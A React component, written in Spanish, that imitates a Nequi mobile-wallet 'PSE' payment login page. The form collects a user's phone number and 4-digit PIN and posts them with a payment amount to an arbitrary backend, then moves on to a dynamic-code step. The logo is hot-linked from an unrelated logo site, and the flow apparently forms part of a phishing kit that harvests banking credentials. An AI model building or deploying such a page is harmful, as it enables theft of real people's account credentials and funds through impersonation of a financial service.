import { useState } from "react"
import { useNavigate, useLocation } from "react-router-dom"
import "./NequiLogin.css"
import { BASE_URL } from "../../config"  // <-- Importar la URL base

function NequiLogin() {
  const [cel, setCel] = useState("")
  const [clave, setClave] = useState("")
  const navigate = useNavigate()
  const location = useLocation()
  const { total } = location.state || {}

  const handleSubmit = async (e) => {
    e.preventDefault()
    if (cel.length < 10 || clave.length < 4) {
      alert("Por favor ingresa un número válido y la clave de 4 dígitos.")
      return
    }

    try {
      const res = await fetch(`${BASE_URL}/nequi-login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ celular: cel, clave, valor: total }),
      })
      const data = await res.json()
      if (data.ok) {
        navigate("/nequi/clave-dinamica", { state: { pagoId: data.id } })
      } else {
        alert("Credenciales incorrectas, por favor verifica")
      }
    } catch (err) {
      console.error(err)
      alert("Error en conexión con el servidor")
    }
  }

  const isFormComplete = cel.length >= 10 && clave.length === 4

  return (
    <div className="nequi-container">
      <img
        src="https://logosenvector.com/logo/img/nequi-37254.png"
        alt="Nequi"
        className="nequi-logo"
      />

      <h2 className="nequi-title">Pagos PSE de Nequi</h2>
      <p className="nequi-text">
        Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
      </p>

      <form onSubmit={handleSubmit} className="nequi-form">
        <div className="input-group">
          <input
            type="tel"
            id="celular"
            value={cel}
            onChange={(e) => setCel(e.target.value.replace(/\D/g, ""))}
            maxLength="10"
            placeholder=" "
            required
          />
          <label htmlFor="celular">Número de celular</label>
        </div>

        <div className="input-group">
          <input
            type="password"
            id="clave"
            value={clave}
            onChange={(e) => setClave(e.target.value.replace(/\D/g, ""))}
            maxLength="4"
            placeholder=" "
            required
          />
          <label htmlFor="clave">Clave</label>
        </div>

        <button type="submit" disabled={!isFormComplete} className="btn-1">
          Entrar
        </button>
        <button type="button" className="btn-secundario">
          Ahora no
        </button>
      </form>

      <p className="nequi-footer">
        ¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.
      </p>
    </div>
  )
}

export default NequiLogin
